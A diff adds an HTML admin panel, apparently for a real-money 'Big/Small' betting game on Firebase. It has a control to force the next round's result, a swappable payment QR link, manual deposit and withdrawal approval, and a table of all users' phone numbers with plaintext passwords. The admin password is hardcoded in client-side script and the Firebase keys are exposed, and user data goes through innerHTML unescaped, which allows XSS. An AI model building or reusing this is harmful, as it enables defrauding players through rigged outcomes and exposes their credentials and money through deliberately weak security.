@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MASTER CONTROL | Beast Admin</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --admin-bg: #050505; --neon-blue: #00d2ff; --neon-gold: #f3ba2f; --danger: #ff3355; --success: #00ff88; }
+        body { background: var(--admin-bg); color: white; font-family: 'Rajdhani', sans-serif; margin: 0; padding: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 12px; }
+        h1, h2 { font-family: 'Orbitron'; color: var(--neon-blue); text-transform: uppercase; border-bottom: 2px solid #222; padding-bottom: 10px; }
+        
+        /* Form Elements */
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #000; color: white; border: 1px solid #444; border-radius: 5px; }
+        button { cursor: pointer; border: none; font-weight: bold; border-radius: 5px; transition: 0.3s; padding: 10px; }
+        .btn-save { background: var(--neon-blue); color: #000; width: 100%; }
+        
+        /* Transaction Cards */
+        .req-item { background: #1a1a1a; padding: 15px; margin-bottom: 10px; border-left: 5px solid var(--neon-gold); }
+        .btn-group { display: flex; gap: 10px; margin-top: 10px; }
+        .approve { background: var(--success); color: black; flex: 1; }
+        .reject { background: var(--danger); color: white; flex: 1; }
+        
+        /* Login Overlay */
+        #authOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+    </style>
+</head>
+<body>
+
+<div id="authOverlay">
+    <h2 style="color: var(--neon-gold)">SYSTEM ACCESS KEY</h2>
+    <input type="password" id="adminPassInput" placeholder="Enter Secret Password" style="max-width: 300px; text-align: center;">
+    <button onclick="checkAdminPass()" style="background: var(--neon-gold); width: 200px;">UNLOCK SYSTEM</button>
+</div>
+
+<div id="mainDashboard" style="display: none;">
+    <h1>BEAST MASTER PANEL</h1>
+
+    <div class="grid">
+        <div class="card">
+            <h2>Game Control</h2>
+            <p>Set Result for Next Period:</p>
+            <select id="nextResultSelect">
+                <option value="auto">RANDOM (System Logic)</option>
+                <option value="Big">FORCE BIG</option>
+                <option value="Small">FORCE SMALL</option>
+            </select>
+            <button class="btn-save" onclick="updateResult()">UPDATE RESULT</button>
+            <p id="currentStatus" style="font-size: 12px; color: #888; margin-top: 10px;">Current Status: Loading...</p>
+        </div>
+
+        <div class="card">
+            <h2>Payment Settings</h2>
+            <p>Update QR Code URL (Image Link):</p>
+            <input type="text" id="qrUrlInput" placeholder="Paste your QR image URL here">
+            <button class="btn-save" style="background: var(--neon-gold);" onclick="updateQR()">UPDATE QR CODE</button>
+            <div style="margin-top: 10px; font-size: 12px;">Active QR: <span id="activeQR" style="color:var(--neon-gold)">Default</span></div>
+        </div>
+    </div>
+
+    <br>
+
+    <div class="grid">
+        <div class="card">
+            <h2>Pending Deposits</h2>
+            <div id="depositList">Fetching requests...</div>
+        </div>
+
+        <div class="card">
+            <h2>Withdrawal Requests</h2>
+            <div id="withdrawList">Fetching requests...</div>
+        </div>
+    </div>
+
+    <br>
+
+    <div class="card">
+        <h2>Registered Members</h2>
+        <table width="100%" style="border-collapse: collapse; font-size: 14px;">
+            <thead>
+                <tr style="color: #888;">
+                    <th>Phone</th>
+                    <th>Password</th>
+                    <th>Balance</th>
+                </tr>
+            </thead>
+            <tbody id="userTableBody"></tbody>
+        </table>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, set, get, update, onValue, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyBBlKPL2V0JKCYN_GBGGSqDBZr7kFNiKZc",
+        authDomain: "beast-web-cff81.firebaseapp.com",
+        databaseURL: "https://beast-web-cff81-default-rtdb.firebaseio.com",
+        projectId: "beast-web-cff81",
+        storageBucket: "beast-web-cff81.firebasestorage.app",
+        messagingSenderId: "457850837406",
+        appId: "1:457850837406:web:32263b2b15fb8705ddde8f"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // 1. Password Protection
+    window.checkAdminPass = () => {
+        const pass = document.getElementById('adminPassInput').value;
+        if(pass === "myselfyg26") {
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('mainDashboard').style.display = 'block';
+            initAdminData();
+        } else {
+            alert("WRONG ACCESS KEY! INTRUDER ALERT.");
+        }
+    };
+
+    function initAdminData() {
+        // Result Control Sync
+        onValue(ref(db, 'admin/nextResult'), (s) => {
+            document.getElementById('currentStatus').innerText = "Active Command: " + (s.val() || 'auto');
+        });
+
+        // QR Code Sync
+        onValue(ref(db, 'admin/qrUrl'), (s) => {
+            document.getElementById('activeQR').innerText = s.val() ? "Link Set" : "Default";
+        });
+
+        // Load Deposits
+        onValue(ref(db, 'requests/deposits'), (s) => {
+            const list = document.getElementById('depositList');
+            list.innerHTML = "";
+            s.forEach(child => {
+                const d = child.val();
+                if(d.status === 'pending') {
+                    list.innerHTML += `<div class="req-item">
+                        <b>User:</b> ${d.phone} | <b>Amt:</b> ₹${d.amount} <br>
+                        <b>UTR:</b> ${d.utr} <br>
+                        <div class="btn-group">
+                            <button class="approve" onclick="actionDep('${child.key}', '${d.phone}', ${d.amount}, 'approve')">APPROVE</button>
+                            <button class="reject" onclick="actionDep('${child.key}', null, null, 'reject')">REJECT</button>
+                        </div>
+                    </div>`;
+                }
+            });
+        });
+
+        // Load Withdrawals
+        onValue(ref(db, 'requests/withdrawals'), (s) => {
+            const list = document.getElementById('withdrawList');
+            list.innerHTML = "";
+            s.forEach(child => {
+                const w = child.val();
+                if(w.status === 'pending') {
+                    list.innerHTML += `<div class="req-item" style="border-left-color: var(--neon-blue)">
+                        <b>User:</b> ${w.phone} | <b>Amt:</b> ₹${w.amount} <br>
+                        <b>Name:</b> ${w.name} | <b>UPI:</b> ${w.upi} <br>
+                        <div class="btn-group">
+                            <button class="approve" style="background:var(--neon-blue)" onclick="actionWit('${child.key}', '${w.phone}', ${w.amount}, 'approve')">MARK PAID</button>
+                            <button class="reject" onclick="actionWit('${child.key}', null, null, 'reject')">REJECT</button>
+                        </div>
+                    </div>`;
+                }
+            });
+        });
+
+        // Load Users List
+        onValue(ref(db, 'users'), (s) => {
+            const tbody = document.getElementById('userTableBody');
+            tbody.innerHTML = "";
+            s.forEach(child => {
+                const u = child.val();
+                tbody.innerHTML += `<tr style="border-bottom: 1px solid #222;">
+                    <td>${u.phone}</td>
+                    <td>${u.password}</td>
+                    <td style="color:var(--success)">₹${u.balance || 0}</td>
+                </tr>`;
+            });
+        });
+    }
+
+    // UPDATE FUNCTIONS
+    window.updateResult = () => {
+        const val = document.getElementById('nextResultSelect').value;
+        set(ref(db, 'admin/nextResult'), val);
+        alert("COMMAND EXECUTED: Result forced to " + val);
+    };
+
+    window.updateQR = () => {
+        const url = document.getElementById('qrUrlInput').value;
+        if(!url) return alert("Please enter image URL");
+        set(ref(db, 'admin/qrUrl'), url);
+        alert("QR CODE UPDATED GLOBALLY");
+    };
+
+    // ACTION FUNCTIONS
+    window.actionDep = async (id, phone, amt, type) => {
+        if(type === 'approve') {
+            const userRef = ref(db, `users/${phone}`);
+            const snap = await get(userRef);
+            await update(userRef, { balance: (snap.val().balance || 0) + amt });
+            await update(ref(db, `requests/deposits/${id}`), { status: 'success' });
+            alert("DEPOSIT APPROVED: Balance added to user.");
+        } else {
+            await update(ref(db, `requests/deposits/${id}`), { status: 'failed' });
+            alert("DEPOSIT REJECTED.");
+        }
+    };
+
+    window.actionWit = async (id, phone, amt, type) => {
+        if(type === 'approve') {
+            const userRef = ref(db, `users/${phone}`);
+            const snap = await get(userRef);
+            if(snap.val().balance < amt) return alert("Error: User balance less than withdraw amount!");
+            await update(userRef, { balance: snap.val().balance - amt });
+            await update(ref(db, `requests/withdrawals/${id}`), { status: 'success' });
+            alert("WITHDRAW SUCCESS: Balance deducted.");
+        } else {
+            await update(ref(db, `requests/withdrawals/${id}`), { status: 'failed' });
+            alert("WITHDRAW REJECTED.");
+        }
+    };
+
+</script>
+</body>
+</html>
